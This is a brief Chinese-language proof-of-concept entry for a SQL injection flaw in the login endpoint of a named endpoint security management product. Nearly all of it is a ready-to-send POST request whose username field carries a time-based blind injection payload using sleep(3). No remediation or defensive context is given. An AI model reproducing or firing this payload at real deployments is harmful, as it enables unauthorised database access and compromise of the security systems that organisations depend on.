## 某信景云终端安全管理系统 login SQL注入漏洞 
```
POST /api/user/login

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='
```
